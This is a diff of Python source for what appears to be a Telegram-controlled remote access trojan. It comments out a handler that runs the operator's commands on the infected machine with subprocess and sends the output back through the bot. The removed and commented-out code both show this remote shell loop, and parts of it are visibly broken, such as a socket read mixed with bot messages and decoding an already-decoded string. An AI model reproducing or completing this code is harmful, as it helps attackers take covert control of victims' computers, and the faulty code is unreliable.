@@ -116,24 +116,22 @@ def send_welcome(message):
 def managerat(message):
     command = message.text
             
-    if command == 'shell':
-        while 1:
-            command = s.recv(1024).decode()
-            if command.lower() == 'exit' :
-                break
-            if command == 'cd':
-                os.chdir(command[3:].decode('utf-8'))
-                dir = os.getcwd()
-                dir1 = str(dir)
-                bot.reply_to(message,dir1.encode())
-            output = subprocess.getoutput(command)
-            bot.reply_to(message,output.encode())
-            if not output:
-                rat.errorsend(message)
-    
-    
-    
-    elif command == 'breakstream':
+    # if command[:5] == 'shell':
+#         while 1:
+            
+#             if command.lower() == 'exit' :
+#                 break
+#             if command[6:] == 'cd':
+#                 os.chdir(command[3:].decode('utf-8'))
+#                 dir = os.getcwd()
+#                 dir1 = str(dir)
+#                 bot.reply_to(message,dir1.encode())
+#             output = subprocess.getoutput(command[6:])
+#             bot.reply_to(message,output.encode())
+#             if not output:
+#                 rat.errorsend(message)
+
+    if command == 'breakstream':
         pass
     elif command == 'list':
         pass
